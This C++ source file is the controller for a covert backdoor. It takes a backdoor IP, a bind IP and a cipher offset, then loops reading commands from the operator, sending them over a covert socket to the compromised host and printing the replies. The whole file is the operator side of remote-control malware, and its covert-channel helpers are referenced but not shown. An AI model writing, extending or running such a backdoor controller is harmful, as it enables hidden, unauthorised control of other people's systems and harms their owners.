/**
 * This is the controller for controlling the backdoor
 *
 * Author: Sean H
 */

#include <iostream>
#include <string.h>
#include <pthread.h>

#include "../utils/Logger.h"
#include "CovertSocket.h"
#include "NetworkMonitor.h"

#define BUFFER_LENGTH 1024

int setArgs(int, char**);
int controlBackdoorLoop(CovertSocket, NetworkMonitor*);

std::string backdoorIP;
std::string bindIP;
int cypherOffset;

int main(int argc, char* argv[])
{
    int result;

    Logger::debug("Starting backdoor client controller");

    result = setArgs(argc, argv);
    if(result != 0) //This will exit the program if setArgs failed
    {
        if(result == 2) //If the user just wanted to print the help menu
        {
            return 0;
        } else { //This is if they failed to set the args completely
            Logger::error("Failed to set args, exiting");
            return 1;
        }
    }

    CovertSocket covertSocket(backdoorIP, bindIP, cypherOffset);
    NetworkMonitor * networkMonitor = NetworkMonitor::getInstance(cypherOffset);
    networkMonitor->getInterface();
    controlBackdoorLoop(covertSocket, networkMonitor);

    return 0;
}

/**
 * This will get the command line args and set them as variables for use in main
 */
int setArgs(int argc, char* argv[])
{
    if(argc == 2 && strcmp(argv[1], "-h") == 0)
    {
        std::cout << "Usage:" << std::endl <<
        "For help: " <<  argv[0] << " -h" << std::endl <<
        "For connection: " << argv[0] << " Backdoor_IP Bind_IP [debug]" << std::endl;
        return 2;
    }

    if(argc < 3 or argc > 6) //This checks if the valid amount of args are passed in (valid arg numbers: 1 extra)
    {
        Logger::error("Invalid number or args inputted");
        return 1;
    }


    backdoorIP = argv[1]; //Set the first arg as the server IP
    bindIP = argv[2];

    if(argc > 3)
    {
        cypherOffset = stoi(argv[3]);
    }
    else
    {
        cypherOffset = 0;
    }
    if(argc == 5 && strcmp(argv[4], "debug") == 0)
    {
        Logger::setDebug(true);
    }
    return 0;
}

/**
 * This loop will send a command to the backdoor then wait for the reply.
 */
int controlBackdoorLoop(CovertSocket covertSocket, NetworkMonitor * networkMonitor )
{
    bool running = true;
    std::string command;
    char commandBuffer[BUFFER_LENGTH];
    std::string response;

    while(running)
    {
        std::cout << ">";
        std::cin.getline(commandBuffer, sizeof(commandBuffer)); //Get command form stdin
        command  = commandBuffer;

        covertSocket.sendCommand(command); //Send command
        response = networkMonitor->getResponse(); //Await reply
        std::cout << std::endl << response << std::endl;
    }
}
